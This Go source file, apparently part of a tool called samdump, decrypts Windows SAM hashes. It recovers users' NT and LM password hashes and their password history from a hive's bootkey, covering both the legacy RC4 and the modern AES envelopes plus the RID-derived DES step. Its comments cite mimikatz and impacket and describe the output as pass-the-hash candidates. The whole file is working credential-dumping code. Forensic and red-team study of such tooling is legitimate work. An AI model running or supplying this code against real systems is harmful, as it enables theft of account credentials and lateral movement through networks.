package samdump

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/md5"
	"crypto/rc4"
	"encoding/binary"
	"errors"
	"fmt"
)

// Per-user NT/LM hash decryption.
//
// Each user's F value carries one of two hash-encryption envelopes
// for the NT and LM hashes:
//
//   - Legacy (pre-Win 10 1607): MD5(hashedBootkey || rid_le ||
//     "NTPASSWORD\0") → RC4 key → 16 bytes; further DES-decrypt with
//     two RID-derived DES keys.
//   - Modern (Win 10 1607+): SAM_HASH_AES envelope (Revision, Salt,
//     Data) → AES-128-CBC(hashedBootkey, IV=Salt) → 16 bytes; then
//     same RID-derived DES de-permutation.
//
// The final DES de-permutation step is identical between the two
// paths: split the 4-byte RID into two 8-byte DES keys via a fixed
// rotation, transformKey-extends each to 8 bytes with parity, and
// DES-ECB decrypts the two halves of the 16-byte intermediate.

// ErrUserHash is returned when a user's hash blob in the F value is
// truncated, the AES envelope is malformed, or the SAM_HASH revision
// is unknown.
var ErrUserHash = errors.New("samdump: user hash decrypt failed")

// Hash encryption envelope constants. The four ASCII strings are
// hard-coded into Microsoft's SAM hash derivation since NT 4.0;
// every credential dumper (mimikatz, impacket, SharpKatz) reuses
// them verbatim. The "HISTORY" variants gate the per-user
// password-history blob (see decryptUserNTHistory).
var (
	hashEncNTPassword        = []byte("NTPASSWORD\x00")
	hashEncLMPassword        = []byte("LMPASSWORD\x00")
	hashEncNTPasswordHistory = []byte("NTPASSWORDHISTORY\x00")
	hashEncLMPasswordHistory = []byte("LMPASSWORDHISTORY\x00")
)

// SAM_HASH revision tags carried at the start of the per-user hash
// envelope.
const (
	hashRevisionLegacy = 0x00010001 // legacy MD5+RC4 path
	hashRevisionAES    = 0x00010002 // modern SAM_HASH_AES path
)

// decryptUserNTHistory decrypts the NT password-history blob `enc`
// of user `rid` using the domain `hashedBootkey`. enc is the raw
// SAM_HASH (legacy) or SAM_HASH_AES (modern) wrapper carved from the
// V record; its Data field is N concatenated 16-byte hashes (most
// recent first). Returns N decrypted hashes (each 16 bytes), or nil
// + nil when no history is present (empty enc, header-only AES
// envelope, or PasswordHistorySize=0). nil + error on real failures.
//
// Operationally: pair with decryptUserNT to get the FULL set of
// pass-the-hash candidates for a single account — current NT plus
// up to 24 historical NT hashes (Windows default
// `MaximumPasswordHistory=24`).
func decryptUserNTHistory(hashedBootkey []byte, rid uint32, enc []byte) ([][]byte, error) {
	return decryptUserHashHistory(hashedBootkey, rid, enc, hashEncNTPasswordHistory)
}

// decryptUserLMHistory is the LM-history counterpart. The constant
// differs but every other step is identical. Modern Windows builds
// (1607+) have LM hashing disabled by default — expect this to
// return (nil, nil) on every account on a current host.
func decryptUserLMHistory(hashedBootkey []byte, rid uint32, enc []byte) ([][]byte, error) {
	return decryptUserHashHistory(hashedBootkey, rid, enc, hashEncLMPasswordHistory)
}

// decryptUserHashHistory mirrors decryptUserHash but unwraps an
// N-block payload instead of a single hash. Both wrapper variants
// (legacy SAM_HASH + modern SAM_HASH_AES) are supported; the bulk
// stream/block cipher operates over the full Data field in one
// pass, then the result is split into 16-byte chunks each
// independently DES-de-permuted with the user's RID-derived keys.
func decryptUserHashHistory(hashedBootkey []byte, rid uint32, enc, encMarker []byte) ([][]byte, error) {
	if len(hashedBootkey) != 16 {
		return nil, fmt.Errorf("%w: hashedBootkey length %d, want 16", ErrUserHash, len(hashedBootkey))
	}
	if len(enc) == 0 {
		return nil, nil
	}
	if len(enc) < hashWrapperLen {
		return nil, fmt.Errorf("%w: history blob shorter than 4-byte SAM_HASH wrapper (%d)",
			ErrUserHash, len(enc))
	}
	revision := binary.LittleEndian.Uint16(enc[hashWrapperOffRevision : hashWrapperOffRevision+2])

	var bulkPlain []byte
	switch revision {
	case 0x0002:
		// SAM_HASH_AES with N×16 Data field. decryptHashHistoryAES
		// returns the full plaintext block (or nil if header-only).
		var err error
		bulkPlain, err = decryptHashHistoryAES(hashedBootkey, enc)
		if err != nil {
			return nil, err
		}
		if bulkPlain == nil {
			return nil, nil
		}
	case 0x0001:
		// SAM_HASH (legacy): 4-byte header + N×16 RC4-encrypted bytes.
		dataLen := len(enc) - hashWrapperLen
		if dataLen == 0 {
			return nil, nil
		}
		if dataLen%16 != 0 {
			return nil, fmt.Errorf("%w: legacy history data length %d not aligned to 16-byte blocks",
				ErrUserHash, dataLen)
		}
		rc4Key := deriveLegacyHashKey(hashedBootkey, rid, encMarker)
		rc, err := rc4.NewCipher(rc4Key)
		if err != nil {
			return nil, fmt.Errorf("%w: rc4 NewCipher: %v", ErrUserHash, err)
		}
		bulkPlain = make([]byte, dataLen)
		rc.XORKeyStream(bulkPlain, enc[hashWrapperLen:])
	default:
		return nil, fmt.Errorf("%w: unknown SAM_HASH revision 0x%04X (history)", ErrUserHash, revision)
	}

	// Split into 16-byte intermediate blocks and apply the per-RID
	// DES de-permutation independently to each — the same final
	// step used for the current hash.
	if len(bulkPlain)%16 != 0 {
		return nil, fmt.Errorf("%w: history plaintext length %d not aligned to 16 bytes",
			ErrUserHash, len(bulkPlain))
	}
	count := len(bulkPlain) / 16
	out := make([][]byte, 0, count)
	for i := 0; i < count; i++ {
		hash, err := desUnwrap(rid, bulkPlain[i*16:(i+1)*16])
		if err != nil {
			return nil, fmt.Errorf("history block %d: %w", i, err)
		}
		out = append(out, hash)
	}
	return out, nil
}

// decryptHashHistoryAES is the multi-block sibling of decryptHashAES.
// The envelope layout is identical (PekID/Revision/DataOffset/Salt/
// Data); the Data field carries N AES-CBC blocks (N × 16 bytes)
// instead of one. Returns the full plaintext payload (N × 16 bytes)
// — the caller splits + de-permutes per chunk. Header-only envelopes
// (no Data) return (nil, nil).
func decryptHashHistoryAES(hashedBootkey, enc []byte) ([]byte, error) {
	const (
		offSalt = 0x08
		offData = 0x18
	)
	if len(enc) <= offData {
		// Header-only ⇒ no history (PasswordHistorySize=0 or
		// fresh account). Same convention as decryptHashAES.
		return nil, nil
	}
	if len(enc) < offData+16 {
		return nil, fmt.Errorf("%w: AES history envelope shorter than %d bytes (%d)",
			ErrUserHash, offData+16, len(enc))
	}
	salt := enc[offSalt : offSalt+16]
	cipherBytes := enc[offData:]
	if len(cipherBytes)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("%w: AES history data length %d not aligned to AES block",
			ErrUserHash, len(cipherBytes))
	}
	block, err := aes.NewCipher(hashedBootkey)
	if err != nil {
		return nil, fmt.Errorf("%w: aes NewCipher (history): %v", ErrUserHash, err)
	}
	mode := cipher.NewCBCDecrypter(block, salt)
	plain := make([]byte, len(cipherBytes))
	mode.CryptBlocks(plain, cipherBytes)
	return plain, nil
}

// decryptUserNT decrypts the NT hash blob `enc` of user `rid` using
// the domain `hashedBootkey`. enc is the raw 16-byte (legacy) or
// header+payload (AES) blob carved from the V/F values by the user
// walker. Returns the 16-byte NT hash, or nil + nil on an empty
// hash slot (account has no NT hash set), or nil + error on a real
// failure.
func decryptUserNT(hashedBootkey []byte, rid uint32, enc []byte) ([]byte, error) {
	return decryptUserHash(hashedBootkey, rid, enc, hashEncNTPassword)
}

// decryptUserLM is the LM-hash counterpart. The constant differs but
// every other step is identical.
func decryptUserLM(hashedBootkey []byte, rid uint32, enc []byte) ([]byte, error) {
	return decryptUserHash(hashedBootkey, rid, enc, hashEncLMPassword)
}

// SAM_HASH wrapper layout (4-byte header at +0..+4):
//
//	+0x00 PekID    uint16 (=1; SAM key index, always one)
//	+0x02 Revision uint16 (1 = legacy MD5+RC4, 2 = AES envelope)
//
// The V value carves a per-user NT-hash slot of 0x14 bytes (legacy:
// 4-header + 16-byte cipher) or 0x38 bytes (AES: 4-header + 4
// DataOffset + 16 Salt + 16 cipher) and stuffs this wrapper as the
// blob — operators reading impacket's V parser see this layout.
const (
	hashWrapperOffPekID    = 0x00
	hashWrapperOffRevision = 0x02
	hashWrapperLen         = 0x04
)

func decryptUserHash(hashedBootkey []byte, rid uint32, enc, encMarker []byte) ([]byte, error) {
	if len(hashedBootkey) != 16 {
		return nil, fmt.Errorf("%w: hashedBootkey length %d, want 16", ErrUserHash, len(hashedBootkey))
	}
	if len(enc) == 0 {
		return nil, nil
	}
	if len(enc) < hashWrapperLen {
		return nil, fmt.Errorf("%w: blob shorter than 4-byte SAM_HASH wrapper (%d)",
			ErrUserHash, len(enc))
	}
	revision := binary.LittleEndian.Uint16(enc[hashWrapperOffRevision : hashWrapperOffRevision+2])
	switch revision {
	case 0x0002:
		// SAM_HASH_AES: {PekID(2), Revision(2), DataOffset(4),
		// Salt[16], Data[...]}. Total payload is at least
		// 4 + 4 + 16 + 16 = 40 bytes for one cipher block. Header-
		// only envelopes (24 bytes) signal "no hash set" — return
		// nil cleanly without raising a warning.
		intermediate, err := decryptHashAES(hashedBootkey, enc)
		if err != nil {
			return nil, err
		}
		if intermediate == nil {
			return nil, nil
		}
		return desUnwrap(rid, intermediate)
	case 0x0001:
		// SAM_HASH (legacy): {PekID(2), Revision(2), Hash[16]}.
		// Total = 0x14 bytes.
		if len(enc) < hashWrapperLen+16 {
			return nil, fmt.Errorf("%w: legacy hash blob shorter than 20 bytes (%d)",
				ErrUserHash, len(enc))
		}
		rc4Key := deriveLegacyHashKey(hashedBootkey, rid, encMarker)
		rc, err := rc4.NewCipher(rc4Key)
		if err != nil {
			return nil, fmt.Errorf("%w: rc4 NewCipher: %v", ErrUserHash, err)
		}
		intermediate := make([]byte, 16)
		rc.XORKeyStream(intermediate, enc[hashWrapperLen:hashWrapperLen+16])
		return desUnwrap(rid, intermediate)
	default:
		return nil, fmt.Errorf("%w: unknown SAM_HASH revision 0x%04X", ErrUserHash, revision)
	}
}

// decryptHashAES handles the SAM_HASH_AES envelope. Layout:
//
//	+0x00 PekID    uint16 (=1)
//	+0x02 Revision uint16 (=2, validated by caller)
//	+0x04 DataOffset uint32 (typically 0x14)
//	+0x08 Salt[16] — AES IV
//	+0x18 Data[...] — AES-128-CBC ciphertext (variable; may be 0)
//
// Returns the first 16 plaintext bytes. When the envelope carries
// only the header (no Data field — Microsoft's "hash not set"
// encoding observed on built-in Administrator / Guest), returns
// (nil, nil) so the orchestrator records an absent NT/LM hash
// without raising a per-user warning.
func decryptHashAES(hashedBootkey, enc []byte) ([]byte, error) {
	const (
		offSalt = 0x08
		offData = 0x18
	)
	if len(enc) <= offData {
		// Header-only envelope ⇒ hash absent. Common for accounts
		// that never had a password set (Administrator on a fresh
		// install, Guest, DefaultAccount).
		return nil, nil
	}
	if len(enc) < offData+16 {
		return nil, fmt.Errorf("%w: AES hash envelope shorter than %d bytes (%d)",
			ErrUserHash, offData+16, len(enc))
	}
	salt := enc[offSalt : offSalt+16]
	cipherBytes := enc[offData:]
	if len(cipherBytes)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("%w: AES hash data length %d not aligned to AES block",
			ErrUserHash, len(cipherBytes))
	}
	block, err := aes.NewCipher(hashedBootkey)
	if err != nil {
		return nil, fmt.Errorf("%w: aes NewCipher: %v", ErrUserHash, err)
	}
	mode := cipher.NewCBCDecrypter(block, salt)
	plain := make([]byte, len(cipherBytes))
	mode.CryptBlocks(plain, cipherBytes)
	out := make([]byte, 16)
	copy(out, plain[:16])
	return out, nil
}

// deriveLegacyHashKey computes the RC4 key Microsoft uses to wrap a
// per-user legacy NT/LM hash:
//
//	MD5(hashedBootkey || RID_le_uint32 || encMarker)
//
// where encMarker is "NTPASSWORD\0" or "LMPASSWORD\0".
func deriveLegacyHashKey(hashedBootkey []byte, rid uint32, encMarker []byte) []byte {
	var ridLE [4]byte
	binary.LittleEndian.PutUint32(ridLE[:], rid)
	h := md5.New()
	h.Write(hashedBootkey)
	h.Write(ridLE[:])
	h.Write(encMarker)
	return h.Sum(nil)
}

// desUnwrap applies the final RID-derived DES de-permutation. The
// 16-byte intermediate (post-RC4 or post-AES) is split into two
// 8-byte halves; each half is DES-ECB decrypted with one of the two
// keys derived from RID. The concatenation is the final NT/LM hash.
func desUnwrap(rid uint32, intermediate []byte) ([]byte, error) {
	if len(intermediate) != 16 {
		return nil, fmt.Errorf("%w: intermediate length %d, want 16", ErrUserHash, len(intermediate))
	}
	k1, k2 := desKeysForRID(rid)
	c1, err := des.NewCipher(k1)
	if err != nil {
		return nil, fmt.Errorf("%w: des NewCipher #1: %v", ErrUserHash, err)
	}
	c2, err := des.NewCipher(k2)
	if err != nil {
		return nil, fmt.Errorf("%w: des NewCipher #2: %v", ErrUserHash, err)
	}
	out := make([]byte, 16)
	c1.Decrypt(out[0:8], intermediate[0:8])
	c2.Decrypt(out[8:16], intermediate[8:16])
	return out, nil
}

// desKeysForRID derives the two 8-byte DES keys Microsoft uses to
// permute a per-user hash. Layout (impacket `deriveKey`):
//
//	rid_le = uint32 little-endian
//	raw1 = rid_le[0..4] || rid_le[0..3]   // 7 bytes
//	raw2 = rid_le[3..4] || rid_le[0..4] || rid_le[0..2]
//
// Each 7-byte raw key is then expanded to 8 bytes with parity bits
// via transformKey56to64.
func desKeysForRID(rid uint32) ([]byte, []byte) {
	var ridLE [4]byte
	binary.LittleEndian.PutUint32(ridLE[:], rid)
	raw1 := []byte{
		ridLE[0], ridLE[1], ridLE[2], ridLE[3],
		ridLE[0], ridLE[1], ridLE[2],
	}
	raw2 := []byte{
		ridLE[3], ridLE[0], ridLE[1], ridLE[2],
		ridLE[3], ridLE[0], ridLE[1],
	}
	return transformKey56to64(raw1), transformKey56to64(raw2)
}

// transformKey56to64 inserts parity bits into a 7-byte (56-bit) key
// to produce the 8-byte DES key the standard library expects.
// Cross-checked against impacket's `transformKey` and
// SharpKatz `Sam.cs`.
func transformKey56to64(in []byte) []byte {
	if len(in) != 7 {
		// Should never happen — internal caller guarantees length.
		// Fall through with a zero pad to keep behavior defined.
		padded := make([]byte, 7)
		copy(padded, in)
		in = padded
	}
	out := make([]byte, 8)
	out[0] = in[0] >> 1
	out[1] = ((in[0] & 0x01) << 6) | (in[1] >> 2)
	out[2] = ((in[1] & 0x03) << 5) | (in[2] >> 3)
	out[3] = ((in[2] & 0x07) << 4) | (in[3] >> 4)
	out[4] = ((in[3] & 0x0F) << 3) | (in[4] >> 5)
	out[5] = ((in[4] & 0x1F) << 2) | (in[5] >> 6)
	out[6] = ((in[5] & 0x3F) << 1) | (in[6] >> 7)
	out[7] = in[6] & 0x7F
	for i := range out {
		out[i] = (out[i] << 1)
	}
	return out
}
